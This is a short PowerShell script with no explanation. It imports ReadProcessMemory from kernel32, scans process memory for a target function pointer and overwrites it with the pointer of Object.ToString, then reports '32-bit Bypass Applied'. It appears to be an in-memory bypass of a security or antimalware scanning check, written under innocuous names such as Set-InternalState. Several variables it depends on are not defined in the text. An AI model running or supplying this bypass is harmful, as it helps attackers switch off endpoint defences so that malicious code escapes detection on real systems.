$n1 = "Win32Int"
$Win32Code = @"
using System;
using System.Runtime.InteropServices;
public class $n1 {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr h, IntPtr b, [Out] byte[] r, int s, out int n);
}
"@
if (-not ([System.Management.Automation.PSTypeName]$n1).Type) {
    Add-Type -TypeDefinition $Win32Code
}

function Set-InternalState {
    [CmdletBinding()]
    Param()

    :RaidLoop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
        # 32-bit Pointer Math
        [IntPtr] $v_ptr = [Int32]$MethodPointer - $j
        $v_buf = [byte[]]::new($ReadBytes)
        
        $status = [Win32Int]::ReadProcessMemory($Handle, $v_ptr, $v_buf, $ReadBytes, [ref]$dummy)

        # Slice 4 bytes for 32-bit comparison
        for ($i = 0; $i -le ($v_buf.Length - 4); $i++) {
            $slice = $v_buf[$i..($i+3)]
            
            # ToInt32 is the key to preventing the Arithmetic Overflow in 32-bit
            [IntPtr] $v_comp = [bitconverter]::ToInt32($slice, 0)

            if ($v_comp -eq $funcAddr) {
                [IntPtr] $v_patch = [Int32]$v_ptr + $i
                break RaidLoop
            }
        }
    }

    if ($v_patch) {
        # Overwrite with a safe return (ToString)
        $v_dummy = [object].GetMethod('ToString').MethodHandle.GetFunctionPointer()
        $v_payload = [IntPtr[]] ($v_dummy)
        [System.Runtime.InteropServices.Marshal]::Copy($v_payload, 0, $v_patch, 1)
        Write-Output "32-bit Bypass Applied: $((Get-Date) - $InitialDate)"
    }
}
Set-InternalState
